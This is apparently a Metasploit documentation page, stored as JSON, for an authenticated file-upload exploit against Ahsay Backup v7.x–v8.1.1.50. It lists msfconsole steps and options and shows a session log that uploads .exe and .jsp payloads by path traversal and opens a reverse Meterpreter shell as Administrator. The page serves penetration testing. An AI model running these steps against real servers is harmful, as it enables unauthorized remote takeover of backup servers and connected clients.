{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/misc/ahsay_backup_fileupload","result":{"data":{"moduleMetadataJson":{"id":"1731a46b-6bb3-5769-9d4f-68dd9c20075c","name":"Ahsay Backup v7.x-v8.1.1.50 (authenticated) file upload","fullname":"exploit/windows/misc/ahsay_backup_fileupload","description":"This module exploits an authenticated insecure file upload and code\n       execution flaw in Ahsay Backup v7.x - v8.1.1.50. To succesfully execute\n       the upload credentials are needed, default on Ahsay Backup trial\n       accounts are enabled so an account can be created.\n\n       It can be exploited in Windows and Linux environments to get remote code\n       execution (usualy as SYSTEM). This module has been tested successfully\n       on Ahsay Backup v8.1.1.50 with Windows 2003 SP2 Server. Because of this\n       flaw all connected clients can be configured to execute a command before\n       the backup starts. Allowing an attacker to takeover even more systems\n       and make it rain shells!\n\n       Setting the CREATEACCOUNT to true will create a new account, this is\n       enabled by default.\n       If credeantials are known enter these and run the exploit.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/windows/misc/ahsay_backup_fileupload","documentationSlug":"/modules/documentation/exploit/windows/misc/ahsay_backup_fileupload","referencesSlug":"/modules/references/exploit/windows/misc/ahsay_backup_fileupload"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Ahsay Backup v7.x - v8.1.1.50\nDownload the vulnerable version: <code class=\"language-text\">http://ahsay-dn.ahsay.com/v8/81150/cbs-win.exe</code>\nStart the application ( I start it manually from <code class=\"language-text\">C:\\Program Files\\AhsayCBS\\bin\\startup.bat</code>)</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start <code class=\"language-text\">msfconsole</code></li>\n<li><code class=\"language-text\">use exploit/windows/misc/ahsay_fileupload</code></li>\n<li>enable create trial account <code class=\"language-text\">set CREATEACCOUNT true</code></li>\n<li>set RHOST <code class=\"language-text\">set RHOST 172.16.238.175</code></li>\n<li>set LHOST <code class=\"language-text\">set LHOST 172.16.238.235</code></li>\n<li>run exploit <code class=\"language-text\">run</code></li>\n<li>We should receive a meterpreter shell.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>   CREATEACCOUNT  - Create a Trial account, use this when trial accounts is enabled and you do not have a valid credentials.\nPASSWORD       - Password to Ahsay useraccount, if CREATEACCOUNT is set this password will be used.\nRHOST          - Target address.\nRPORT          - The target port (TCP).\nTARGETURI      - Path to Ahsay installation\nUPLOADPATH     - Path to where the file should be uploaded\nUSERNAME       - Username to Ahsay account, if CREATEACCOUNT is set this username will be used.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"ahsay-81150-on-windows-2003-sp2\" style=\"position:relative;\"><a href=\"#ahsay-81150-on-windows-2003-sp2\" aria-label=\"ahsay 81150 on windows 2003 sp2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Ahsay 8.1.1.50 on Windows 2003 SP2</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(windows/misc/ahsay_fileupload) &gt; set CREATEACCOUNT true\nCREATEACCOUNT =&gt; true\nmsf exploit(windows/misc/ahsay_fileupload) &gt; set RHOST 172.16.238.175\nRHOST =&gt; 172.16.238.175\nmsf exploit(windows/misc/ahsay_fileupload) &gt; set LHOST 172.16.238.235\nLHOST =&gt; 172.16.238.235\nmsf exploit(windows/misc/ahsay_fileupload) &gt; run\n\n[*] Started reverse TCP handler on 172.16.238.235:4444 \n[+] Username and password are valid!\n[+] No need to create account, already exists!\n[*] Uploading payload\n[+] Succesfully uploaded ../../webapps/cbs/help/en/lcofxnrzON.exe\n[*] Uploading payload\n[+] Succesfully uploaded ../../webapps/cbs/help/en/myjnJMFlNi.jsp\n[*] Triggering exploit! https://172.16.238.175:443/cbs/help/en/myjnJMFlNi.jsp\n[+] Exploit executed!\n[*] Sending stage (179779 bytes) to 172.16.238.175\n[*] Meterpreter session 1 opened (172.16.238.235:4444 -&gt; 172.16.238.175:1114) at 2019-07-16 14:59:45 +0200\n[!] This exploit may require manual cleanup of &#39;../../webapps/cbs/help/en/lcofxnrzON.exe&#39; on the target\n[!] This exploit may require manual cleanup of &#39;../../webapps/cbs/help/en/myjnJMFlNi.jsp&#39; on the target\n\nmeterpreter &gt; getuid\nServer username: AHSAY-123\\Administrator</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"1731a46b-6bb3-5769-9d4f-68dd9c20075c"}}}